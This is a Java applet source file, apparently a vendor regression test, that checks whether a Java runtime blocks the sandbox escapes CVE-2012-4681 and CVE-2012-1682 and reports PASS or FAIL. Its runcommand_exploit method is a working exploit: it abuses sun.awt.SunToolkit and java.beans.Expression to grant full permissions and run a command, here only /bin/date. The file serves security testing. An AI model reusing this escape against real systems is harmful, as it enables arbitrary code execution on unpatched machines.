/*
 * ** Red Hat Confidential **
 *
 * run via appletviewer or browser plugin
 *
 * covers both CVE-2012-4681 and CVE-2012-1682
 */

import java.beans.Statement;
import java.beans.Expression;
import java.security.AccessControlException;

import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;
import java.io.InputStreamReader;
import java.io.BufferedReader;

import java.applet.Applet;
import java.awt.*;

public class GondvvTestcaseApplet extends Applet {
	public static int runproc(Process proc) throws Exception {
		BufferedReader cmdout = new BufferedReader(new InputStreamReader(proc.getInputStream()));
		String line;
		while ((line = cmdout.readLine()) != null) {
			System.out.println(line);
		}
		proc.waitFor();
		return proc.exitValue();
	}

	public static void runcommand_exploit(String cmd) throws Exception {
		Expression exec_ex = new Expression(Runtime.getRuntime(), "exec", new String[]{ cmd });

		Permissions perms = new Permissions();
		perms.add(new AllPermission());
		ProtectionDomain protdomain = new ProtectionDomain(
			new CodeSource(new URL("file:///"), new Certificate[0]), perms);
		AccessControlContext acc = new AccessControlContext(new ProtectionDomain[]{ protdomain });

		Expression tmp_ex = new Expression(Class.class, "forName", new Object[]{ "sun.awt.SunToolkit" });
		tmp_ex.execute();
		Class toolkit = (Class)tmp_ex.getValue();

		tmp_ex = new Expression(toolkit, "getField", new Object[]{Statement.class, "acc" });
		tmp_ex.execute();
		((Field)tmp_ex.getValue()).set(exec_ex, acc);
		exec_ex.execute();

		runproc((Process)exec_ex.getValue());
	}

	public static void runcommand_direct(String cmd) throws Exception {
		runproc(Runtime.getRuntime().exec(cmd));
	}

	public void init() {
		String[] args = new String[] { "/bin/date" };
		int rv = 0;

		try {
			System.out.println("Directly calling: Class.forName(\"sun.awt.SunToolkit\")");

			Object cl = Class.forName("sun.awt.SunToolkit");
			System.out.println("FAIL: " + cl.toString());
			rv = 1;
		} catch (AccessControlException e) {
			System.out.println("OK: got expected: " + e.toString());
		} catch (Exception e) {
			System.out.println("FAIL: unexpected exception: " + e.toString());
			e.printStackTrace();
			rv = 1;
		}
		System.out.println();


		try {
			System.out.println("Calling: Expression(Class.class, \"forName\", new String[]{\"sun.awt.SunToolkit\"})");

			Expression ex = new Expression(Class.class, "forName", new String[]{"sun.awt.SunToolkit"});
			ex.execute();
			Object cl = ex.getValue();
			System.out.println("FAIL: " + cl.toString());
			rv = 1;

			System.out.println();
			System.out.println("Checking if SunToolkit class reference is usable");
			try {
				ex = new Expression(cl, "getField", new Object[]{Byte.class, "SIZE"});
				ex.execute();
				System.out.println("FAIL: " + ex.getValue().toString());
			} catch (NoSuchMethodException e) {
				System.out.println("INFO: " + e.toString());
				e.printStackTrace();
			} catch (Exception e) {
				System.out.println("FAIL: unexpected exception: " + e.toString());
				e.printStackTrace();
			}

			try {
				ex = new Expression(cl, "getField", new Object[]{Statement.class, "acc"});
				ex.execute();
				System.out.println("FAIL: " + ex.getValue().toString());
			} catch (NoSuchMethodException e) {
				System.out.println("INFO: " + e.toString());
				e.printStackTrace();
			} catch (Exception e) {
				System.out.println("FAIL: unexpected exception: " + e.toString());
				e.printStackTrace();
			}
		} catch (AccessControlException e) {
			System.out.println("OK: got expected: " + e.toString());
		} catch (Exception e) {
			System.out.println("FAIL: unexpected exception: " + e.toString());
			e.printStackTrace();
			rv = 1;
		}
		System.out.println();

		try {
			System.out.println("Running command directly: " + args[0]);
			runcommand_direct(args[0]);
			System.out.println("FAIL: commnad was run");
			rv = 1;
		} catch (AccessControlException e) {
			System.out.println("OK: got expected: " + e.toString());
		} catch (Exception e) {
			System.out.println("FAIL: unexpected exception: " + e.toString());
			e.printStackTrace();
			rv = 1;
		}
		System.out.println();

		try {
			System.out.println("Running command using exploit: " + args[0]);
			runcommand_exploit(args[0]);
			System.out.println("FAIL: commnad was run");
			rv = 1;
		} catch (AccessControlException e) {
			System.out.println("OK: got expected: " + e.toString());
		} catch (NoSuchMethodException e) {
			System.out.println("FAIL: " + e.toString());
			e.printStackTrace();
			rv = 1;
		} catch (Exception e) {
			System.out.println("FAIL: unexpected exception: " + e.toString());
			e.printStackTrace();
			rv = 1;
		}
		System.out.println();

		Label l;
		if (rv == 0) {
			l = new Label("PASS");
			l.setBackground(Color.green);
		} else {
			l = new Label("FAIL");
			l.setBackground(Color.red);
		}
		this.add(l);

		System.out.println("Final state: " + l.getText());
	}

}
